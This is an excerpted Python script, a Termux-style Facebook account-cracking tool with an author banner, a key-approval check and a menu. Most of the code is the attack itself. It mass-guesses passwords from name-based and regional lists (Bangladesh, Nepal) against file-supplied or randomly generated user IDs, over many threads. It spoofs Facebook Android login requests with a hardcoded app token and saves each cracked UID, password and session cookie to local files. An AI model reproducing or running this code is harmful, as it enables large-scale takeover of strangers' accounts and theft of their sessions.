...
import smtplib
import math
import os,base64,zlib,pip,urllib,uuid
def clear():
        os.system('clear')
try:
...
xx=requests.get('https://raw.githubusercontent.com/FORHAD-XD-777/Nepalese/main/ua.txt').text.splitlines()
...
\033[1;32m║\033[0;93m ██║     ╚██████╔╝██║  ██║██║  ██║██║  ██║██████╔╝
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
~Y8888P' `8888Y' YP  YP  YP YP   YP VP   V8P \033[1;32mLiya\033[1;37m

\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

\033[1;32m[\033[1;31m✓\033[1;32m] Author     : MUHAMMAD FORHAD
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : github.com/Dx-Forhad0090
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : MD FORHAD HOSEN
...
\033[1;32m[\033[1;31m✓\033[1;32m] WHAT'S UPP.:\033[1;35m 01619869949 
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
class apvroval:
    def check():
        url = "https://github.com/Dx-Forhad0090/Approval.-txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system( 'xdg-open https://wa.me/qr/32XJZSUEMQYEA1')
        except Exception as e:
            print(e)
            exit()
...
def menu():
        try:
              #  approval()
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m-\033[1;32m] EXAMPLE : /sdcard/FORHAD-XD.txt ');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_uid = str(len(fo))
                                        print(f'\033[1;32m[\033[1;31m-\033[1;32m] TOTAL ACCOUNT :{A} '+total_uid+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,uid,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,uid,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,uid,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api4,uid,names,passlist)
                                ...
                                os.system('xdg-open https://wa.link/q1eps6');menu()
                        elif xd in ['0','05']:
...
def bd():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=70) as habib:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','sadiya','sumaiya','Sumaiya','Sadiya','first last','first12','first123','firstlast','first1234']
				if mthd in ['1','01']:
...
def nepal():
		...
		with tred(max_workers=30) as habib:	
			...
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal123','kathmandu','tamang','maya','magar','magar123','pokhara','pokhara123','tamang123','maya123''first123','first12345']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
...
def api1(uid,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}FORHAD-XD-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/287.1.0.51.119;[FBAN/FB4A;FBAVFBBV/245251828;FBDM/{density=3'+'.0,width='+'1080,height='+'1920};FBLC/hi_ID;FBRV/248611694;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-C900Y;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        ...
                        headers=headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": ___Firexd___(),"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}FORHAD-XD-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/FORHAD-XD-FILE-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}FORHAD-XD-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FORHAD-XD-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def api2(uid,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}FORHAD-XD-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/241.0.0.17.116;[FBAN/FB4A;FBAVFBBV/182747440aa;FBDM/{density=3'+'.0,width='+'1424,height='+'720};FBLC/hi_ID;FBRV/279865282;FBCR/Telkomsel;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/CPH1909;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        headers = headers = {
    'authority': 'mbasic.prod.facebook.com',
    'accept': '*/*',
    ...
    'viewport-width': '391',
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/FORHAD-XD-FILE-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api3(uid,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}FORHAD-XD-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = ["Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/142.0.0.28.92;FBPN/com.facebook.orca;FBLC/en_US;FBBV/137.0.0.24.91;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/99.0.0.26.69;FBDM/{density=2.5,width=1280,height=1920};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/7.3.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"]
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/FORHAD-XD-FILE-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
"Content-Length": str(len(content_lenght))}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/FORHAD-XD-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def rndm2(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua =f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-J3119 Build/QPR1.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/65.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};[FBAN/FB4A;FBAV/167.0.0.42.94;FBBV/102203135;FBDM/'+'{density=2.0,width=720,height=1280}'+';FBLC/en_US;FBRV/105409289;FBCR/Verizon Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J3119S;FBSV/5.1.2;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        headers=headers = {'authority': 'mbasic.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    # 'cookie': 'datr=Gwm3ZeHBMXx9pkl4CS8v6vO2; sb=Gwm3ZTqu_rcAbImNe4MslOX-; locale=en_GB; vpd=v1%3B669x360x1.8391053676605225; ps_n=0; ps_l=0; oo=v1; wd=391x727; fr=0RJ1zE743u1Gw4GiD..BluNUI.wT.AAA.0.0.BluNUM.AWUE2Jg3Gvw',
    'dpr': '1.83911',
    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    ...
    'viewport-width': '391',
                        ...
                        url = 'https://b-graph.facebook.com/login/device-based/regular/login/?refsrc'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}FORHAD-XD-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE-{G}]>{R} "+coki)
                                        open('/sdcard/FORHAD-XD-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="125", "Chromium";v="125"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6268.209 Safari/537.36',
}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE-{G}]>{R} "+coki)
                                        open('/sdcard/FORHAD-XD-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
